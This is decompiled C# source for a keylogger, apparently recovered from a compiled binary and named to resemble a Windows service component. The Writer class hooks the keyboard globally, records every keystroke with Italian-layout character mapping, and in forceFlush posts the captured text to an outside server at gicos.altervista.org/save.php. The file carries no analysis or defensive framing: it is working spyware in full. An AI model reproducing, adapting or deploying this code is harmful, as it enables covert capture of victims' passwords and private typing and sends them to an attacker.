using System;
using System.Collections.Specialized;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace WinSVCK;

public class Writer
{
	[AccessedThroughProperty("kbHook")]
	private KeyboardHook _kbHook;

	private string bufferString;

	private bool maiusc;

	private bool ctrl;

	private bool alt;

	private bool altgr;

	private virtual KeyboardHook kbHook
	{
		get
		{
			return _kbHook;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			KeyboardHook.KeyUpEventHandler value2 = kbHook_KeyUp;
			KeyboardHook.KeyDownEventHandler value3 = kbHook_KeyDown;
			if (_kbHook != null)
			{
				KeyboardHook.KeyUp -= value2;
				KeyboardHook.KeyDown -= value3;
			}
			_kbHook = value;
			if (_kbHook != null)
			{
				KeyboardHook.KeyUp += value2;
				KeyboardHook.KeyDown += value3;
			}
		}
	}

	public Writer()
	{
		kbHook = new KeyboardHook();
		bufferString = "";
		maiusc = Control.IsKeyLocked((Keys)20);
	}

	private void kbHook_KeyDown(Keys Key)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Invalid comparison between Unknown and I4
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Invalid comparison between Unknown and I4
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Invalid comparison between Unknown and I4
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0041: Invalid comparison between Unknown and I4
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Invalid comparison between Unknown and I4
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Invalid comparison between Unknown and I4
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Invalid comparison between Unknown and I4
		//IL_0060: Unknown result type (might be due to invalid IL or missing references)
		//IL_0066: Invalid comparison between Unknown and I4
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_0076: Invalid comparison between Unknown and I4
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Invalid comparison between Unknown and I4
		//IL_00a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_037a: Expected I4, but got Unknown
		//IL_0494: Unknown result type (might be due to invalid IL or missing references)
		//IL_05e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_062c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0632: Unknown result type (might be due to invalid IL or missing references)
		//IL_0640: Expected I4, but got Unknown
		//IL_064c: Unknown result type (might be due to invalid IL or missing references)
		//IL_06ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_06ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_06ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_06b4: Invalid comparison between Unknown and I4
		//IL_06d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_06d7: Invalid comparison between Unknown and I4
		//IL_06f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_06fa: Invalid comparison between Unknown and I4
		//IL_0717: Unknown result type (might be due to invalid IL or missing references)
		//IL_071d: Invalid comparison between Unknown and I4
		//IL_0746: Unknown result type (might be due to invalid IL or missing references)
		//IL_0779: Unknown result type (might be due to invalid IL or missing references)
		//IL_0798: Unknown result type (might be due to invalid IL or missing references)
		//IL_079b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a6d: Expected I4, but got Unknown
		//IL_0a79: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cd2: Unknown result type (might be due to invalid IL or missing references)
		if ((int)Key == 160)
		{
			maiusc = true;
		}
		else if ((int)Key == 161)
		{
			maiusc = true;
		}
		else if ((int)Key == 32)
		{
			bufferString += " ";
		}
		else
		{
			if ((int)Key == 13 || (int)Key == 91 || (int)Key == 92)
			{
				return;
			}
			if ((int)Key == 162)
			{
				ctrl = true;
			}
			else if ((int)Key == 163)
			{
				ctrl = true;
			}
			else if ((int)Key == 262144)
			{
				alt = true;
			}
			else if ((int)Key == 165)
			{
				altgr = true;
			}
			else if (maiusc & !altgr)
			{
				switch (Key - 48)
				{
				case 0:
					bufferString += "=";
					break;
				case 1:
					bufferString += "!";
					break;
				case 2:
					bufferString += "\"";
					break;
				case 3:
					bufferString += "£";
					break;
				case 4:
					bufferString += "$";
					break;
				case 5:
					bufferString += "%";
					break;
				case 6:
					bufferString += "&";
					break;
				case 7:
					bufferString += "/";
					break;
				case 8:
					bufferString += "(";
					break;
				case 9:
					bufferString += ")";
					break;
				case 17:
				case 18:
				case 19:
				case 20:
				case 21:
				case 22:
				case 23:
				case 24:
				case 25:
				case 26:
				case 27:
				case 28:
				case 29:
				case 30:
				case 31:
				case 32:
				case 33:
				case 34:
				case 35:
				case 36:
				case 37:
				case 38:
				case 39:
				case 40:
				case 41:
				case 42:
					bufferString += ((Enum)Key).ToString();
					break;
				case 138:
					bufferString += "é";
					break;
				case 139:
					bufferString += "*";
					break;
				case 140:
					bufferString += ";";
					break;
				case 141:
					bufferString += "_";
					break;
				case 142:
					bufferString += ":";
					break;
				case 143:
					bufferString += "§";
					break;
				case 144:
					bufferString += "ç";
					break;
				case 171:
					bufferString += "?";
					break;
				case 172:
					bufferString += "|";
					break;
				case 173:
					bufferString += "^";
					break;
				case 174:
					bufferString += "°";
					break;
				default:
					bufferString = bufferString + "<SHIFT+" + ((Enum)Key).ToString() + ">";
					break;
				case 178:
					bufferString += ">";
					break;
				}
			}
			else if (maiusc & altgr)
			{
				switch (Key - 186)
				{
				default:
					bufferString = bufferString + "<SHIFT+ALTGR+" + ((Enum)Key).ToString() + ">";
					break;
				case 0:
					bufferString += "{";
					break;
				case 1:
					bufferString += "}";
					break;
				}
			}
			else if (altgr)
			{
				if ((int)Key == 186)
				{
					bufferString += "[";
				}
				else if ((int)Key == 187)
				{
					bufferString += "]";
				}
				else if ((int)Key == 192)
				{
					bufferString += "@";
				}
				else if ((int)Key == 222)
				{
					bufferString += "#";
				}
				else
				{
					bufferString = bufferString + "<ALTGR+" + ((Enum)Key).ToString() + ">";
				}
			}
			else if (ctrl)
			{
				bufferString = bufferString + "<CTRL+" + ((Enum)Key).ToString() + ">";
			}
			else
			{
				switch (Key - 48)
				{
				case 17:
				case 18:
				case 19:
				case 20:
				case 21:
				case 22:
				case 23:
				case 24:
				case 25:
				case 26:
				case 27:
				case 28:
				case 29:
				case 30:
				case 31:
				case 32:
				case 33:
				case 34:
				case 35:
				case 36:
				case 37:
				case 38:
				case 39:
				case 40:
				case 41:
				case 42:
					bufferString += ((Enum)Key).ToString().ToLower();
					break;
				case 0:
				case 48:
					bufferString += "0";
					break;
				case 1:
				case 49:
					bufferString += "1";
					break;
				case 2:
				case 50:
					bufferString += "2";
					break;
				case 3:
				case 51:
					bufferString += "3";
					break;
				case 4:
				case 52:
					bufferString += "4";
					break;
				case 5:
				case 53:
					bufferString += "5";
					break;
				case 6:
				case 54:
					bufferString += "6";
					break;
				case 7:
				case 55:
					bufferString += "7";
					break;
				case 8:
				case 56:
					bufferString += "8";
					break;
				case 9:
				case 57:
					bufferString += "9";
					break;
				case 138:
					bufferString += "è";
					break;
				case 139:
					bufferString += "+";
					break;
				case 140:
					bufferString += ",";
					break;
				case 141:
					bufferString += "-";
					break;
				case 142:
					bufferString += ".";
					break;
				case 143:
					bufferString += "ù";
					break;
				case 144:
					bufferString += "ò";
					break;
				case 171:
					bufferString += "'";
					break;
				case 172:
					bufferString += "\\";
					break;
				case 173:
					bufferString += "ì";
					break;
				case 174:
					bufferString += "à";
					break;
				default:
					bufferString = bufferString + "<" + ((Enum)Key).ToString() + ">";
					break;
				case 178:
					bufferString += "<";
					break;
				}
			}
		}
	}

	private void kbHook_KeyUp(Keys Key)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Invalid comparison between Unknown and I4
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Invalid comparison between Unknown and I4
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Invalid comparison between Unknown and I4
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0044: Invalid comparison between Unknown and I4
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Invalid comparison between Unknown and I4
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_006c: Invalid comparison between Unknown and I4
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_007d: Invalid comparison between Unknown and I4
		//IL_0097: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Invalid comparison between Unknown and I4
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Invalid comparison between Unknown and I4
		//IL_00ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cd: Invalid comparison between Unknown and I4
		//IL_00e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ea: Invalid comparison between Unknown and I4
		if ((int)Key == 160)
		{
			maiusc = false;
		}
		else if ((int)Key == 161)
		{
			maiusc = false;
		}
		else if ((int)Key == 162)
		{
			ctrl = false;
		}
		else if ((int)Key == 163)
		{
			ctrl = false;
		}
		else if ((int)Key == 262144)
		{
			alt = false;
		}
		else if ((int)Key == 165)
		{
			altgr = false;
		}
		else if ((int)Key == 13)
		{
			bufferString += "\r\n";
		}
		else if ((int)Key == 20)
		{
			maiusc = !maiusc;
		}
		else if ((int)Key == 91)
		{
			bufferString += "<WIN>";
		}
		else if ((int)Key == 92)
		{
			bufferString += "<WIN>";
		}
		else if ((int)Key == 9)
		{
			bufferString += "<TAB>";
		}
	}

	public void forceFlush(bool closing)
	{
		string text = bufferString;
		try
		{
			bufferString = "";
			using WebClient webClient = new WebClient();
			NameValueCollection nameValueCollection = new NameValueCollection();
			nameValueCollection.Add("val", text);
			byte[] bytes = webClient.UploadValues("http://gicos.altervista.org/save.php", "POST", nameValueCollection);
			new UTF8Encoding().GetString(bytes);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bufferString = text + bufferString;
			ProjectData.ClearProjectError();
		}
	}
}
